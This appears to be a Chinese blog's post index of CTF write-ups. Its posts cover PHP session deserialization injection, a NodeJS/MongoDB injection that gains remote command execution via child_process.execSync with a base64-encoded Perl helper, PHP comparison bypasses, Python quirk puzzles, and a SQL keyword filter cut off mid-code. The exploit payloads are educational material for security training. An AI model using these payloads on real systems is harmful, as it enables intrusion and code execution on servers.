所以，回到题目，我们最终目标是要构造出像a:2:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;这样的序列化字符串（核心是img字段内容），但是提交的时候要通过_SESSION[function]和_SESSION[user]构造出来这个字符串（直接提交_SESSION[img]没用，因为会重新覆盖成guest_img.php）。 我们手动构造一下：首先function与user一定会出现而img是我们要的，那么把对象数变成3字符串变成：a:3:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:8:\"function\";s:6:\"123456\";&#125;，我们自始至终可控的只有123456这个部分。flag会被过滤掉，变成：a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";&#125;，这个时候我们会多出来一个单引号，我们在123456后面添加\";，字符串会变成：a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";\";&#125;，user字段的值变成\";s:8:\"function\";s:6:\"123456，我们在后面插入自定义的img字段信息，变成：a:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";s:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;，然后修正一下user和function的长度，变成：a:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:43:\"123456\";s：3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;，结束了么？并没有。我们回过头看本文第一张图，在function后面，它会自动添加上s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\"，我们要把它屏蔽掉，否则对象数不对，很简单，加个;&#125;强制结束掉序列化字符串就行了，这样后面就会当做垃圾不影响结果了。最终序列化字符串长这个样子：a:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:45:\"123456\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;，然后有点小问题，user在这里是置空的，但是我们需要让其过滤成空，所以还要小小调整一下：a:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:43:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;。所以我们POST _SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;，然后本地还是没打通，为什么呢？看一下结果：a:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:45:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;，现在的反序列化结果存在user字段，内容为\";s:8:\"function\";s:45:\"1234然后就是img字段了，我们强行注入结果干掉了function字段，因此我们还需要补上另一个字段。所以最后我们提交：_SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:1:\"1\";s:1:\"1\";&#125;，本地可以打通了。 放到BUUOJ上开题。 那就换文件读呗。 Done。 flag{79424a28-5fda-49ec-8c16-636f2e761f1a}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"BUUOJ刷题-Web-996Game","slug":"BUUOJ刷题-Web-996Game","date":"2019-12-01T11:13:06.000Z","updated":"2019-12-10T12:15:12.586Z","comments":true,"path":"2019/12/01/BUUOJ刷题-Web-996Game/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/","excerpt":"*CTF 2019的996Game。给了个Hint:db.a.find(&#123;\"b\":&#123;\"$gt\":1,\"c\":\"d\"&#125;&#125;)。 上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https://github.com/Jerenaux/phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。","text":"*CTF 2019的996Game。给了个Hint:db.a.find(&#123;\"b\":&#123;\"$gt\":1,\"c\":\"d\"&#125;&#125;)。 上来就满满的页游画风，目测是某开源网页游戏改的题，果然，翻一下源码，提示我们去找https://github.com/Jerenaux/phaserquest。发现是个NodeJS项目，把源码脱下来看看。发现直接将js目录暴露出来了。 123app.use(&#x27;/css&#x27;,express.static(__dirname + &#x27;/css&#x27;));app.use(&#x27;/js&#x27;,express.static(__dirname + &#x27;/js&#x27;));app.use(&#x27;/assets&#x27;,express.static(__dirname + &#x27;/assets&#x27;)); js/server即为服务端的代码，合理猜测出题人修改了这里。我们把服务器上的源码脱下来进行比对。 多了个eval()，事情就有点大了。 GameServer.server来源于server.js中的声明，var server=require('http').Server(app);和gs.server=server;。而db来自mongodb。也就是说我们需要让findOne操作失败，并且控制返回信息。我们可控的是什么？loadPlayer函数参数一个是socket，一个是id。在server.js中loadPlayer函数在io.on()函数执行时被调用，用的是socket.io库，采用WebSocket协议进行通讯，那么id应该可控。 我们具体跟一下代码，在client下的client.js中发现，客户端会将相关参数保存到浏览器的localStorage里。 123Client.socket.on(&#x27;pid&#x27;,function(playerID)&#123; // the &#x27;pid&#x27; event is used for the server to tell the client what is the ID of the player Client.setLocalData(playerID);&#125;); 那么我们手动修改playerID会怎样？Firefox修改localStorage里的playerID后重刷新页面，Play后发现游戏死在了Creating World阶段，肯定是报错了，但是报错点在哪里？这个光看源码是不够的了，原repo给出了Dockerfile，我们搭起来环境看看。 注意报错点是在bson/lib/objectid.js里的new ObjectID()里。要求我们的playerID是24位字符，随便修改一个合法的playerID进入游戏。我们来看一下objectid.js里面有什么内容。涉及到的new ObjectID代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243var ObjectID = function ObjectID(id) &#123; // Duck-typing to support ObjectId from different npm packages if (id instanceof ObjectID) return id; if (!(this instanceof ObjectID)) return new ObjectID(id); this._bsontype = &#x27;ObjectID&#x27;; // The most common usecase (blank id, new objectId instance) if (id == null || typeof id === &#x27;number&#x27;) &#123; // Generate a new id this.id = this.generate(id); // If we are caching the hex string if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;); // Return the object return; &#125; // Check if the passed in id is valid var valid = ObjectID.isValid(id); // Throw an error if it&#x27;s not a valid setup if (!valid &amp;&amp; id != null) &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; else if (valid &amp;&amp; typeof id === &#x27;string&#x27; &amp;&amp; id.length === 24 &amp;&amp; hasBufferType) &#123; return new ObjectID(new Buffer(id, &#x27;hex&#x27;)); &#125; else if (valid &amp;&amp; typeof id === &#x27;string&#x27; &amp;&amp; id.length === 24) &#123; return ObjectID.createFromHexString(id); &#125; else if (id != null &amp;&amp; id.length === 12) &#123; // assume 12 byte string this.id = id; &#125; else if (id != null &amp;&amp; id.toHexString) &#123; // Duck-typing to support ObjectId from different npm packages return id; &#125; else &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;);&#125;; 我们的报错是因为没有通过isValid()的检查，isValid()代码如下： 1234567891011121314151617181920212223242526ObjectID.isValid = function isValid(id) &#123; if (id == null) return false; if (typeof id === &#x27;number&#x27;) &#123; return true; &#125; if (typeof id === &#x27;string&#x27;) &#123; return id.length === 12 || (id.length === 24 &amp;&amp; checkForHexRegExp.test(id)); &#125; if (id instanceof ObjectID) &#123; return true; &#125; if (id instanceof _Buffer) &#123; return true; &#125; // Duck-Typing detection of ObjectId like objects if (id.toHexString) &#123; return id.id.length === 12 || (id.id.length === 24 &amp;&amp; checkForHexRegExp.test(id.id)); &#125; return false;&#125;; 用的typeof，如果是Stirng，判断id.length是否等于12。JavaScript是种弱类型语言，原本代码认为提交的id是String对象而直接用length属性获得长度，如果我们构造一个对象，包含length==12的属性呢？Payload为id=&#123;\"id\":&#123;\"length\":12&#125;&#125;。这样就绕过isValid()的检查了，回到ObjectID构造函数，然后它会检查id本身是什么类型，目前我们的id已经是Object了，看下面两个else if： 1234567891011121314else if (id != null &amp;&amp; id.length === 12) &#123; // assume 12 byte string this.id = id; &#125; else if (id != null &amp;&amp; id.toHexString) &#123; // Duck-typing to support ObjectId from different npm packages return id; &#125; else &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;);&#125;; 如果id!=null并且id.length===12则this.id=id，但我们不能走这个判断，因为最后一行会把我们的Payload转成Hex。那么Payload变为id=&#123;\"length\":\"0\",\"id\":&#123;\"length\":12&#125;&#125;，下一个if要求id.toHexString为真，那么Payload变为：id=&#123;\"length\":\"0\",\"toHexString\":true,\"id\":&#123;\"length\":12&#125;&#125;。这样就可以绕过检测了。 我们可控id了，下一步是要控制报错信息。我们的Hint目前还没用上，后端数据库用的是MongoDB。在MongoDB里执行一下Hint试试。 1234567MongoDB shell version: 2.6.10connecting to: test&gt; db.a.find(&#123;&quot;b&quot;:&#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&#125;&#125;)error: &#123; &quot;$err&quot; : &quot;Can&#39;t canonicalize query: BadValue unknown operator: c&quot;, &quot;code&quot; : 17287&#125; $gt在MongoDB是&gt;的意思，是个内置运算符。如果内置运算符放在最前面，后面的内容就会报错，key会显示出来。下面就是传NodeJS的Payload了，用require('child_process').execSync即可。然后有个问题，又来/readflag绕过，用Perl的IPC:Open3来进行管道交互，最终拿到flag。 最终Payload:Client.getPlayerID = () => ({ \"$gt\":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('sh -c \\\"echo \\\\\\'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==\\\\\\'|base64 -d | perl \\\"'));`]:\"bb\", toHexString: 'aaa', length: 0, id: {length: 12}}) 为了方便Payload输入 我们用Base64编码然后传递Perl，没用bash的原因是bash并不是总是存在的，但是sh一定有（说的就是你，Alpine Linux）。 放在控制台里执行，然后点Play触发，就可以在Network的WS里看到结果了。如图所示： P.S. 网上的Payload都没注意引号的转义啊，在控制台里输入Payload的时候要进行单双引号转义，但是传递到NodeJS后原本转义用的\\会被去掉，就变成没转义的，实际上要二次转义。 flag{ef5059f5-8ee6-4727-aca3-6bd720379070}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Pipe","slug":"Pipe","permalink":"http://tiaonmmn.github.io/tags/Pipe/"}]},{"title":"BUUOJ刷题-Web-极客大挑战2019-Buyflag","slug":"BUUOJ刷题-Web-极客大挑战2019-Buyflag","date":"2019-11-25T12:29:01.000Z","updated":"2019-12-10T12:15:12.604Z","comments":true,"path":"2019/11/25/BUUOJ刷题-Web-极客大挑战2019-Buyflag/","link":"","permalink":"http://tiaonmmn.github.io/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/","excerpt":"Syclover极客大挑战的一道题，挺简单的。 上来让我们买Flag。抓一下包，很明显的看到Cookie里有个user=0，我们直接改成1，然后要password，页面后面有一段注释。","text":"Syclover极客大挑战的一道题，挺简单的。 上来让我们买Flag。抓一下包，很明显的看到Cookie里有个user=0，我们直接改成1，然后要password，页面后面有一段注释。 123456789 ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125; is_numberic()绕过，在数字后面加上点字符就可以了，一个空格OK。提交password=404%20，又要我们money。注意到这题Cookie没有用上PHPSESSID，那么这题猜一下逻辑就是直接将我们提交的money与要求的1000000比较，不存在记录的过程。 同时注意到，此题用到的是PHP 5.3.5，老版本PHP了。要求我们不能输入8位字符，而输入其他任何字符都会返回you have not enough money,loser~，合理猜测一下用的是strcmp，那么直接money[]=1就可以了。 然后就返回flag了。 flag{adb90540-9332-4480-a8d7-3d250841adff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"USTC-Hackergame-2019-不同寻常的Python考试","slug":"USTC-Hackergame-2019-不同寻常的Python考试","date":"2019-11-17T04:46:13.000Z","updated":"2019-12-10T12:15:12.676Z","comments":true,"path":"2019/11/17/USTC-Hackergame-2019-不同寻常的Python考试/","link":"","permalink":"http://tiaonmmn.github.io/2019/11/17/USTC-Hackergame-2019-%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84Python%E8%80%83%E8%AF%95/","excerpt":"USTC Hackergame 2019的一道题。 看源码吧：","text":"USTC Hackergame 2019的一道题。 看源码吧： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213#!/usr/bin/env python3import astimport signalimport tracebackfrom copy import deepcopyRED = &quot;\\033[31m&quot;GREEN = &quot;\\033[32m&quot;YELLOW = &quot;\\033[33m&quot;END = &quot;\\033[0m&quot;def timeout(*args, **kwargs): print(&quot;Timeout!&quot;) exit(-1)class Challenges: def __init__(self): signal.signal(signal.SIGALRM, timeout) self.challenges = &#123;&#125; self.cleared = &#123;&#125; for method in dir(self): if method.startswith(&quot;challenge_&quot;): n = int(method.split(&quot;_&quot;)[-1]) self.challenges[n] = getattr(self, method) self.cleared[n] = False def do_challenge(self, n): while True: inp = input(&quot;Your answer: &quot;) if len(inp) &gt; 100: print(&quot;Input too long&quot;) continue try: answer = ast.literal_eval(inp) break except Exception: print(&quot;Invalid input!&quot;) continue signal.alarm(1) print(YELLOW, end=&quot;&quot;) try: if self.challenges[n](answer): print(f&quot;Challenge &#123;n:02d&#125; cleared!&quot;) self.cleared[n] = True else: print(f&quot;Challenge &#123;n:02d&#125; failed!&quot;) except Exception: print(traceback.format_exc(), end=&quot;&quot;) print(END, end=&quot;&quot;) signal.alarm(0) def show_status(self): print() print(&quot;------ Do you know Python? ------&quot;) for i, (challenge, cleared) in enumerate(sorted(self.cleared.items())): color = GREEN if cleared else RED text = &quot;Y&quot; if cleared else &quot;N&quot; print(color + f&quot;&#123;challenge:02d&#125;: &#123;text&#125;&quot; + END, end=&quot; &quot;) if i % 5 == 4: print() print() def cleared_count(self): return sum(self.cleared.values()) def total_count(self): return len(self.challenges) def challenge_1(self, answer): if answer == &quot;Hello&quot;: return True def challenge_2(self, answer): a, b, c, d = answer if a == b and a is b and c == d and c is not d: return True def challenge_3(self, answer): if answer in answer == answer: return True def challenge_4(self, answer): a1, b1 = answer a2, b2 = answer if a1 * 2 != a1 and b1 * 2 != b1: a1 *= 2 b1 *= 2 if a1 == a2 and b1 != b2: return True def challenge_5(self, answer): r = reversed([1, 2, 3]) if list(r) == list(r) + answer: return True def challenge_6(self, answer): a, b = answer if max(a, b) != max(b, a): return True def challenge_7(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b + c) != a * b + a * c: return True def challenge_8(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b * c) != (a * b) * c: return True def challenge_9(self, answer): a, b = answer for x in a, b: if isinstance(x, float) or isinstance(x, complex): return False if type(a ** b) != type(b ** a): return True def challenge_10(self, answer): a, b = answer if a and a.count(b) &gt; len(a): return True def challenge_11(self, answer): if max(answer) != max(*answer): return True def challenge_12(self, answer): a, b = answer if a &lt; b and all(x &gt; y for x, y in zip(a, b)): return True def challenge_13(self, answer): a, b = answer if b and not (a ^ b) - a: return True def challenge_14(self, answer): backup = deepcopy(answer) try: answer[0] += answer[1] except: if backup != answer: return True def challenge_15(self, answer): item, l = answer if item in l and not min(l) &lt;= item &lt;= max(l): return True def challenge_16(self, answer): item, l = answer if item == 233 and item in l and l in l: return True def challenge_17(self, answer): item, l = answer if l[0] == item and item not in l: return True def challenge_18(self, answer): a, b = answer if (a - b) != -(b - a): return True def challenge_19(self, answer): if answer.isdecimal(): if len(answer) &lt; 5: if sum(ord(c) - ord(&quot;0&quot;) for c in answer) == 23333: return True def challenge_20(self, answer): if len(set(str(x) for x in answer)) == 7 and all(x == 0 for x in answer): return Trueif __name__ == &quot;__main__&quot;: c = Challenges() while True: c.show_status() inp = input(&quot;Which one do you want to play? &quot;) try: n = int(inp) except ValueError: print(&quot;Invalid input!&quot;) continue if n not in c.challenges: print(&quot;Challenge not found!&quot;) continue c.do_challenge(n) print(f&quot;Your progress: &#123;c.cleared_count()&#125;/&#123;c.total_count()&#125;&quot;) if c.cleared_count() == c.total_count(): print(&quot;You are the master of Python.&quot;) print(&quot;Here is the final flag:&quot;) print(open(&quot;flag3&quot;).read().strip()) break elif c.cleared_count() &gt;= c.total_count() * 3 // 4: print(open(&quot;flag2&quot;).read().strip()) elif c.cleared_count() &gt;= c.total_count() // 2: print(open(&quot;flag1&quot;).read().strip()) else: print(&quot;Go on to get your flags!&quot;) 明显Python3版本，这段代码核心就是用ast.literal_eval计算我们的输入，与每一Challenge的要求相比较，相等就通过。输入不能超过100个字符。那就一个一个看吧： 01 字符串比较 123def challenge_1(self, answer): if answer == &quot;Hello&quot;: return True 这个很简单，我们输入'Hello'，输入会被处理成字符串，字符串比较。 02 ==与is 1234def challenge_2(self, answer): a, b, c, d = answer if a == b and a is b and c == d and c is not d: return True 我们要输入一个list或tuple，分别赋值a b c d，要求a==b，a与b为同一对象，c==d，c与d不为同一对象。这里就多解了，Python3中char型整数是缓存的（参考这里），因此1 is 1。然后Python比较数字的时候没有要求两数字为同一类型（参考这里），因此1==1.0，但是float类型是不会缓存的，因此1 is not 1.0。第二个判断还可以用任何可变类型，如[1]==[1]，[1] is not [1]。示例答案：[1,1,2,2.0] 03 in的运算符优先级 123def challenge_3(self, answer): if answer in answer == answer: return True Python3中in和==同时使用会怎样？找一下运算符优先级，发现in是后于==计算的，因此那个if可以改写成：if (answer==answer) and (answer in answer):，任意字符串都可以满足上述条件。 04 Unpack与对象内存地址 12345678def challenge_4(self, answer): a1, b1 = answer a2, b2 = answer if a1 * 2 != a1 and b1 * 2 != b1: a1 *= 2 b1 *= 2 if a1 == a2 and b1 != b2: return True 首先明确一点，iterable对象answer在unpack的时候a1,a2 b1,b2具有相同的内存地址。那么这题就简单了：要求a1在*2后地址保持不变，而a2*2后地址要改变。随便找个list和int就行：[[2],2]。 05 reversed与iterator 1234def challenge_5(self, answer): r = reversed([1, 2, 3]) if list(r) == list(r) + answer: return True reversed()函数文档在这里，它返回一个iterator，包含逆序排列过的元素，但是Python3的iterator在访问完全部元素后会变空，因此if判断的第二个list(r)是空的，我们给个[3,2,1]就可以满足条件。 06 max与集合 1234def challenge_6(self, answer): a, b = answer if max(a, b) != max(b, a): return True max()返回参数中最大值，但是对于set而言，不像list等对象，max()应用于集合上会返回更全的集合，如a是b的真子集，返回b，如果a b没有交集则返回元素最多的集合，如a b元素个数相同且没有交集，则返回第一个集合。因此任意给两个集合就可以了：[&#123;1&#125;,&#123;2&#125;]。 07 + * 1234567def challenge_7(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b + c) != a * b + a * c: return True 不允许使用float和complex，要求不满足乘法分配律。Python中+和*可以对iterable对象使用，如果b c为不同字符串，就可以满足条件了：[2,'a','b']。 08 + * Ver 2 1234567def challenge_8(self, answer): a, b, c = answer for x in a, b, c: if isinstance(x, float) or isinstance(x, complex): return False if a * (b * c) != (a * b) * c: return True 跟上一题差不多，要求不能满足乘法结合律。Python中*还可以出现负数，0或负数时结果会变空：[\"a\",-1,-2]。 09 ** 1234567def challenge_9(self, answer): a, b = answer for x in a, b: if isinstance(x, float) or isinstance(x, complex): return False if type(a ** b) != type(b ** a): return True 要求a**b和b**a结果的类型不一致。用的是**，计算N次幂，很容易想到pow(-1,2)==1，pow(2,-1)==0.5。两个数据类型不一致。 10 count 1234def challenge_10(self, answer): a, b = answer if a and a.count(b) &gt; len(a): return True 字符串、bytes和bytearray有count函数，a.count(b)返回a中包含的b的个数。b可以为空，那么返回的结果就会变成len(a)+1。 11 max Ver 2 123def challenge_11(self, answer): if max(answer) != max(*answer): return True max()函数可以直接接参数如max(1,2,3)，也可以接一个list，如max([1,2,3])，max()接list的时候会自动迭代，返回最大的元素，那么max([[2]])会返回[2]，而*会自动迭代，max(*[[2]])==max([2])==2。显然两个并不相等。 12 all zip 1234def challenge_12(self, answer): a, b = answer if a &lt; b and all(x &gt; y for x, y in zip(a, b)): return True 要求a比b小，同时all()满足条件，其中a,b用zip()组合，然后要求a&gt;b。如果a为空list，那么zip()就会变成空list，all([])为True。 13 ^ - 1234def challenge_13(self, answer): a, b = answer if b and not (a ^ b) - a: return True 要求(a^b)-a==0，b!=0。但这不成立，因此参考第6题，我们可以用集合。那么a b同为{1}即可。 14 += 1234567def challenge_14(self, answer): backup = deepcopy(answer) try: answer[0] += answer[1] except: if backup != answer: return True 要求answer[0]+=answer[1]触发异常，同时backup不与answer相同。这个是真的不知道了，参考这个，简单来说就是+可以正常执行，但是=会出现问题然而answer的内容还是改变了。因此传一个([2],[3])就可以了。 15 &gt;&lt; 1234def challenge_15(self, answer): item, l = answer if item in l and not min(l) &lt;= item &lt;= max(l): return True item要在l中，且不满足min(l) &lt;= item &lt;= max(l)，max()可以接iterable对象，例如字符串，那么max('1234')为4，min('1234')为1，返回的都是单字符。那么当l为\"1111\"，item为'11'的时候，min max返回1，\"1\"&lt;\"11\"。 16 bytes 1234def challenge_16(self, answer): item, l = answer if item == 233 and item in l and l in l: return True 要求item==233，item in l和l in l。iterable的对象可以in，字符串可以，但是item是int，int不能in string。Python3中除了字符串，还有令人痛恨的bytes，int可以in bytes：[233,b'\\xe9']。 17 dict [] 1234def challenge_17(self, answer): item, l = answer if l[0] == item and item not in l: return True 要求l[0]==item同时item不在l。能用[]的对象是Subscriptable的，默认情况下目前包括：字符串 元组 列表 字典。那么用字典呢？l==2,item={0:2}，int(2)不在dict({0:2})里，item[0]==2，满足条件。 18 inf nan 1234def challenge_18(self, answer): a, b = answer if (a - b) != -(b - a): return True list等类型不支持-，通常的int float也没办法满足条件。然后想到NaN和Inf。inf-inf==nan，nan!=nan。但是inf没法输入，我们可以用1e2345来构造。 19 Unicode 12345def challenge_19(self, answer): if answer.isdecimal(): if len(answer) &lt; 5: if sum(ord(c) - ord(&quot;0&quot;) for c in answer) == 23333: return True 这个就简单了，字符不一定是ASCII集，Unicode也可以。跑脚本好了。 123456789101112131415161718import sysimport iosys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=&#x27;utf-8&#x27;)result=[]for a in range(0xffff): if(chr(a).isdecimal()): result.append(a)for a in result: for b in result: for c in result: for d in result: if (a + b + c + d - ord(&#x27;0&#x27;) * 4 == 23333): print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(a, b, c, d)) # print(chr(a) + chr(b) + chr(c) + chr(d)) if ((chr(a) + chr(b) + chr(c) + chr(d)).isdecimal()): print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&quot;.format(a, b, c, d)) print(&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;.format(a, b, c, d, chr(a), chr(b), chr(c), chr(d))) 20 int string bool complex float 123def challenge_20(self, answer): if len(set(str(x) for x in answer)) == 7 and all(x == 0 for x in answer): return True 要找7种不同的元素，并且都等于0。 首先想到0 False 0.0 0+0j，然后注意到他是用的str()，str(-0.0)=='-0.0'，str(0.0)=='0.0'，-0.0==0.0==0。那么再加一个-0.0。同样的-0.0-0j也行，-0.0j。 flag{023a745e-c1d4-4a60-8bb0-8fa6d567b264}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"}]},{"title":"BUUOJ刷题-Web-BabyBlog","slug":"BUUOJ刷题-Web-BabyBlog","date":"2019-10-29T08:38:22.000Z","updated":"2020-03-05T07:10:15.606Z","comments":true,"path":"2019/10/29/BUUOJ刷题-Web-BabyBlog/","link":"","permalink":"http://tiaonmmn.github.io/2019/10/29/BUUOJ%E5%88%B7%E9%A2%98-Web-BabyBlog/","excerpt":"ByteCTF 2019的BabyBlog。 扫目录发现有www.zip，那就看源码吧。 config.php里有个SafeFilter()。","text":"ByteCTF 2019的BabyBlog。 扫目录发现有www.zip，那就看源码吧。 config.php里有个SafeFilter()。 12345678910111213function SafeFilter(&amp;$arr)&#123; foreach ($arr as $key =&gt; $value) &#123; if (!is_array($value)) &#123; $filter = &quot;benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\\\(|\\\\b(and|or)\\\\b\\\\s*?([\\\\(\\\\)&#x27;\\&quot;\\\\d]+?=[\\\\(\\\\)&#x27;\\&quot;\\\\d]+?|[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?=[\\\\(\\\\)&#x27;\\&quot;a-zA-Z]+?|&gt;|&lt;|\\s+?[\\\\w]+?\\\\s+?\\\\bin\\\\b\\\\s*?\\(|\\\\blike\\\\b\\\\s+?[\\&quot;&#x27;])|\\\\/\\\\*.*\\\\*\\\\/|&lt;\\\\s*script\\\\b|\\\\bEXEC\\\\b|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)\\s*)SET|INSERT\\\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\\\(.+\\\\)|\\\\s+?.+?\\\\s+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;)|(\\+|-|~|!|@:=|&quot; . urldecode(&#x27;%0B&#x27;) . &quot;).+?)FROM(\\\\(.+\\\\)|\\\\s+?.+?|(`|&#x27;|\\&quot;).*?(`|&#x27;|\\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\\\s+(TABLE|DATABASE)&quot;; if (preg_match(&#x27;/&#x27; . $filter . &#x27;/is&#x27;, $value)) &#123; exit(&quot;&lt;script&gt;alert(&#x27;Failure!Do not use sensitive words.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); &#125; &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125;&#125; Ban了一大堆SQL注入用的关键字。然后就是writing.php负责添加文章，edit.php负责编辑文章。然后在edit.php里有几行： 12345678910if (isset($_POST[&#x27;title&#x27;]) &amp;&amp; isset($_POST[&#x27;content&#x27;]) &amp;&amp; isset($_POST[&#x27;id&#x27;])) &#123; foreach ($sql-&gt;query(&quot;select * from article where id=&quot; . intval($_POST[&#x27;id&#x27;]) . &quot;;&quot;) as $v) &#123; $row = $v; &#125; if ($_SESSION[&#x27;id&#x27;] == $row[&#x27;userid&#x27;]) &#123; $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql-&gt;query(&quot;update article set title=&#x27;$title&#x27;,content=&#x27;$content&#x27; where title=&#x27;&quot; . $row[&#x27;title&#x27;] . &quot;&#x27;;&quot;); exit(&quot;&lt;script&gt;alert(&#x27;Edited successfully.&#x27;);location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;); &#125; update 